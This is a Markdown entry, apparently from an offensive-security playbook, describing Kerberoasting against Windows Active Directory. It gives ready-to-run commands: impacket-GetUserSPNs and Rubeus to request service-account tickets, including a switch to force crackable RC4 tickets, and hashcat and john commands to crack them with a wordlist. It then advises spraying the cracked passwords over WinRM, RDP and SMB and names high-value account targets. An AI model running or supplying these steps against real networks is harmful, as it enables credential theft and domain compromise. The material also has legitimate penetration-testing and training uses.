---
id: kerberoast
title: Kerberoasting
stage: initial-access
tags: [windows, ad]
summary: Request TGS tickets for service accounts with SPNs and crack them offline — service accounts often have weak passwords set years ago and never rotated.
leads_to:
  - winrm
  - rev-shell
  - rdp-access
  - bloodhound
  - pass-the-hash
  - password-cracking
---

## Prerequisites

Any valid domain user credential (even low-privilege). The domain must have service accounts with SPNs configured (run BloodHound first to confirm targets).

Kerberoasting asks the KDC to issue a TGS for every service account SPN in the domain — no special permissions needed. The TGS is encrypted with the service account's password hash and can be cracked offline. RC4-encrypted tickets (`$krb5tgs$23$`) crack much faster than AES (`$krb5tgs$18$`). Service accounts are high-value targets because their passwords are rarely rotated and often weak.

## Quick Win

> Request all roastable tickets in one command and write to file.

```bash
impacket-GetUserSPNs $DOMAIN/user:password -dc-ip $DC_IP -request -outputfile kerberoast.txt
```

## From Windows

> Rubeus — works from a WinRM or RDP session.

```powershell
.\Rubeus.exe kerberoast /outfile:kerberoast.txt
# AES-only tickets: add /rc4opsec to request RC4 instead
.\Rubeus.exe kerberoast /outfile:kerberoast.txt /rc4opsec
```

## Crack

> RC4 (13100) cracks fast — AES (19700) is orders of magnitude slower.

```bash
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.txt
```

## Leads To

Cracked password → spray immediately against WinRM (winrm), RDP (rdp-access), SMB. Service accounts often have elevated privileges in the domain — check in BloodHound what the cracked account can access. High-value targets: `svc-backup`, `svc-sql`, `svc-admin`, anything in the `Domain Admins` or IT groups.
